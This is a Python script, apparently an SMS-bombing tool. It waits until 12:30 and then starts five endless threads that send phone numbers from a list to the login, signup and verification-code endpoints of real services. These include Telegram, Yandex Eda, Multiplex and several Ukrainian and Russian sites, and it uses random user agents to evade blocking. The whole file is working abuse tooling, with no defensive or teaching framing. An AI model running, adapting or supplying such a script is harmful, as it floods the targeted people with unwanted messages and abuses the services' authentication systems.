from user_agent import generate_user_agent
import threading
import requests
import datetime
import time

print(r"""
    __    ____   __    __  __  __ __  __ _   __ ______ ______ ____  _____
   / /   / __ \ / /   / / / /_/ // / / // | / //_  __// ____// __ \/ ___/
  / /   / / / // /   / / /  _  // / / //  |/ /  / /  / __/  / /_/ /\__ \ 
 / /___/ /_/ // /___/ / / / / // /_/ // /|  /  / /  / /___ / _  _/___/ / 
/_____/\____//_______/ /_/ /_/ \____//_/ |_/  /_/  /_____//_/ |_|/____/  

""")

while True:
	if datetime.datetime.now().hour == 12 and datetime.datetime.now().minute == 30:
		break
	else: time.sleep(1)

array = [
'XXXXXXXXXXXX',
'XXXXXXXXXXXX',
'XXXXXXXXXXXX',
]

s3x = 0

def sex(i):
	sex1 = i
	sex2 = i
	while True:
		if sex2 > len(array) - 1:
			sex2 = sex1

		head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}

		try:
			response = requests.post('https://auth.multiplex.ua/login', json = {'login': array[sex2]}, headers = head)
			print('Multiplex: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': '+' + array[sex2]}, headers = head)
			print('Yandex eda: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': '+' + array[sex2]}, headers = head)
			print('MD Fashion: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': '+' + array[sex2]}, headers = head)
			print('Telegram: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': '+' + array[sex2], 'lang': 'ru', 'city': 'spb'}, headers = head)
			print('Taxovichkof: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': '+' + array[sex2]}, headers = head)
			print('XTRA TV: ' + str(response.text))
		except Exception:
			print('Fuck')

		sex2 += 5

thread1 = threading.Thread(target = sex, args = [s3x])
s3x += 1
thread2 = threading.Thread(target = sex, args = [s3x])
s3x += 1
thread3 = threading.Thread(target = sex, args = [s3x])
s3x += 1
thread4 = threading.Thread(target = sex, args = [s3x])
s3x += 1
thread5 = threading.Thread(target = sex, args = [s3x])

thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()